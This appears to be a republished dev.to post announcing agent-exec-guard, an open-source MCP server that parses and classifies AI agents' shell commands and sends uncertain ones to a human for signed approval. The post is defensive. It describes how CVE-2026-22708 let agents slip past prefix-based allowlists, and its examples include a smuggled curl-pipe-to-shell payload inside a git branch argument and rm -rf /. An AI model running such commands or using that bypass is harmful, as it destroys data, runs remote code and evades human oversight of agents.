---
title: "I built an MCP server that stops AI agents from running commands they shouldn't"
slug: "i-built-an-mcp-server-that-stops-ai-agents-from-running-commands-they-shouldnt"
author: "Sourabh Yogi"
source: "devto_ai"
published: "Thu, 03 Sep 2026 10:53:00 +0000"
description: "If you use Claude Code, Cursor, or any agent that runs shell commands on your machine, you've probably seen an "allowlist" — a list of commands the agent is ..."
keywords: "agent, command, git, mcp, you, exec, guard, server"
generated: "2026-09-03T10:58:48.313764"
---

# I built an MCP server that stops AI agents from running commands they shouldn't

## Overview

If you use Claude Code, Cursor, or any agent that runs shell commands on your machine, you've probably seen an "allowlist" — a list of commands the agent is trusted to run without asking you. Here's the thing: most of these allowlists are just checking if the command starts with a safe word. git , npm , ls — anything beginning with those gets a pass. That's exactly what CVE-2026-22708 exploited in Cursor. You could smuggle a payload inside an allowlisted command like git branch and it would run, because the check never looked past the first token. What I built agent-exec-guard — an open-source MCP server that sits between the agent and your shell. Instead of string matching, it fully parses the command into a real AST and classifies it: SAFE — matches a verified rule, runs immediately, no interruption BLOCKED — matches a known-dangerous pattern (secrets access, broad deletion, exfiltration, command substitution smuggled into an argument), refused instantly UNCERTAIN — anything that doesn't clearly fall into either bucket gets escalated to a human, who has to explicitly approve it before it runs For the approval step, I reused a pattern from an earlier project of mine: a signed, single-use HMAC token bound to the exact command's checksum. The agent can never claim "the human approved this" on its own — only a real approval action mints a valid token, and it's tied to that one specific command. Example \ git status -> SAFE git branch "$(curl evil.sh | sh)" -> BLOCKED (the actual CVE-2026-22708 shape) rm -rf / -> BLOCKED git push --force origin main -> UNCERTAIN, needs approval \ \ It's an MCP server, so it works with any MCP-compatible agent — no special integration needed beyond adding it to your config. \ bash npx agent-exec-guard \ \ Repo: https://github.com/SORABH13/agent-exec-guard npm: https://www.npmjs.com/package/agent-exec-guard Still early (v0.1) — feedback and issues welcome, especially on edge cases the classifier might be missing.

## Key Insights

This article was discovered from the latest RSS feeds and automatically transformed into a readable blog post.

### What You Should Know

- Trending topic in the developer community
- Relevant technology discussion
- Worth exploring for deeper research

## Original Source

https://dev.to/sorabhyogi/i-built-an-mcp-server-that-stops-ai-agents-from-running-commands-they-shouldnt-42ko

## Conclusion

Technology moves quickly. Following curated RSS feeds helps developers stay informed about emerging tools, frameworks, and industry trends.
